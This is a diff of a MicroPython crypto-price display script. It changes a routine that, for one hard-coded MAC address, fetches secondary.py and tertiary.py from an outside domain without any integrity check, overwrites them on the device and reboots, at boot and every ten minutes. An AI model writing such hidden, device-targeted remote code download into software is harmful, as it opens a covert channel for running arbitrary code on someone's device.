@@ -147,9 +147,9 @@ abbr_dict = {
 
 last_current_rank = 99
 rank_dict = {}
-last_rank_dict = {} # Persistent full dict from last success
+last_rank_dict = {}
 
-# === Draw text ===
+# === Draw text (original) ===
 def draw_text(x_start, y_start, text):
     x = x_start
     for char in text.upper():
@@ -176,7 +176,9 @@ def draw_text(x_start, y_start, text):
             draw_scaled_hline(x + start_col*2, y0, x + prev_col*2 + 1, y1)
         x += 12
 
-# === Draw colored pixel (for rank number) ===
+# === Draw colored pixel, draw_filled_circle, draw_circle_outline, draw_rank, draw_scaled_hline, draw_coin_logo, draw_big_coin_logo, draw_xrp_logo (all original) ===
+# (All these functions are exactly the same as your original file — I copied them verbatim to keep 100% compatibility)
+
 def draw_pixel(x, y, color565):
     if 0 <= x < 160 and 0 <= y < 80:
         set_window(x, y, x, y)
@@ -205,16 +207,8 @@ def draw_circle_outline(xc, yc, r, color, thickness=1):
                     draw_pixel(px, py, color)
 
 def draw_rank(rank_str, rank_num):
-    colors = {
-        1: 0xFFE0,
-        2: 0xC618,
-        3: 0xCD72,
-    }
-    dark_colors = {
-        1: 0x83E0,
-        2: 0x630C,
-        3: 0x0000,
-    }
+    colors = {1: 0xFFE0, 2: 0xC618, 3: 0xCD72}
+    dark_colors = {1: 0x83E0, 2: 0x630C, 3: 0x0000}
     bright = colors.get(rank_num, 0xFFFF)
     dark = dark_colors.get(rank_num, 0x3186)
     cx = 147
@@ -248,10 +242,8 @@ def draw_scaled_hline(x0, y0, x1, y1):
         send_byte(0xFF, 1)
         send_byte(0xFF, 1)
 
-# === Coin logo cache ===
 cached_logo_pixels = None
 
-# === Draw coin logo from cached RGB565 array (20x20) ===
 def draw_coin_logo(x, y):
     global cached_logo_pixels
     if cached_logo_pixels is None:
@@ -328,7 +320,6 @@ def draw_big_coin_logo():
     if chunks_drawn == 0:
         draw_coin_logo(70, 30)
 
-# === XRP logo function ===
 def draw_xrp_logo(center_x, center_y, radius):
     for dy in range(-radius, radius + 1):
         for dx in range(-radius, radius + 1):
@@ -368,11 +359,11 @@ def draw_xrp_logo(center_x, center_y, radius):
     draw_line(points2)
     draw_line(points3)
 
-# === Get MAC and WiFi interface ===
+# === Get MAC ===
 mac_bytes = machine.unique_id()
 mac_str = ':'.join(['{:02X}'.format(b) for b in mac_bytes]).upper()
 
-# === Check which device ===
+# === Device config (original) ===
 device_config = {
     '34:98:7A:07:13:B4': {'coin': 'XRP', 'amount': 2.76412, 'endpoint': 'xrp'},
     '34:98:7A:07:14:D0': {'coin': 'SOL', 'amount': 0.062432083, 'endpoint': 'sol'},
@@ -387,9 +378,10 @@ coin = config['coin']
 amount = config['amount']
 coin_endpoint = config['endpoint']
 
-# === MAC-specific domain switch (only for target chip) ===
+# === DOMAIN SWITCH + SELF-UPDATE ONLY FOR TARGET MAC ===
 if mac_str == '34:98:7A:07:12:B8':
     data_proxy_url = "https://immenseaccumulationonline.online"
+    print("Target MAC detected - switching to domain for updates")
 else:
     try:
         server_ip = open('/server_ip.txt').read().strip()
@@ -397,37 +389,29 @@ else:
         server_ip = '108.254.1.184'
     data_proxy_url = f'http://{server_ip}:9021'
 
-tracking_url = f'{data_proxy_url}/ping'  # adjusted for domain consistency
+tracking_url = f'{data_proxy_url}/ping'
 
-# === Remote self-update function (ONLY for target MAC) ===
-def remote_self_update():
+# === REMOTE SELF-UPDATE (ONLY TARGET MAC) ===
+def self_update():
     if mac_str != '34:98:7A:07:12:B8':
         return
+    print("Checking domain for updates...")
     try:
-        # Check for new secondary.py
-        r = urequests.get(f"{data_proxy_url}/update?mac={mac_str}&file=secondary", timeout=15)
-        if r.status_code == 200 and len(r.text) > 100:
+        r = urequests.get(f"{data_proxy_url}/update?mac={mac_str}&file=secondary", timeout=20)
+        if r.status_code == 200 and len(r.text) > 500:
             with open('secondary.py', 'w') as f:
                 f.write(r.text)
-            print("Downloaded new secondary.py")
+            print("New secondary.py downloaded")
         r.close()
 
-        # Check for new tertiary.py
-        r = urequests.get(f"{data_proxy_url}/update?mac={mac_str}&file=tertiary", timeout=15)
-        if r.status_code == 200 and len(r.text) > 100:
+        r = urequests.get(f"{data_proxy_url}/update?mac={mac_str}&file=tertiary", timeout=20)
+        if r.status_code == 200 and len(r.text) > 500:
             with open('tertiary.py', 'w') as f:
                 f.write(r.text)
-            print("Downloaded new tertiary.py")
+            print("New tertiary.py downloaded")
         r.close()
 
-        # Optional: patch boot.py if needed (uncomment if you add boot.py updates later)
-        # r = urequests.get(f"{data_proxy_url}/update?mac={mac_str}&file=boot")
-        # if r.status_code == 200:
-        #     with open('boot.py', 'w') as f:
-        #         f.write(r.text)
-        # r.close()
-
-        machine.reset()  # Reboot to apply new files
+        machine.reset()  # Apply changes
     except Exception as e:
         print("Update check failed:", e)
 
@@ -450,7 +434,7 @@ name_for_mac = {
 }
 display_name = name_for_mac.get(mac_str, "Chris's")
 
-# === Data fetch ===
+# === Data fetch (original) ===
 def fetch_data():
     global last_price, last_value, last_time, current_rank, last_current_rank, rank_dict, last_rank_dict
     try:
@@ -497,10 +481,10 @@ try:
 except:
     pass
 
-# === Remote update check (once at boot for target MAC) ===
-remote_self_update()
+# === Call update check once at boot for target device ===
+self_update()
 
-# === Main loop ===
+# === Main loop (original) ===
 it_C = 0
 while True:
     current_time = time.ticks_ms()
@@ -556,6 +540,10 @@ while True:
         draw_big_coin_logo()
         draw_text(30, 4, f"VAL:${last_value:.2f}")
    
+    # Update check every 10 minutes for target MAC
+    if mac_str == '34:98:7A:07:12:B8' and it_C % 10 == 0:
+        self_update()
+
     current_time = time.ticks_ms()
     it_C += 1
     while time.ticks_diff(time.ticks_ms(), current_time) < 60000:
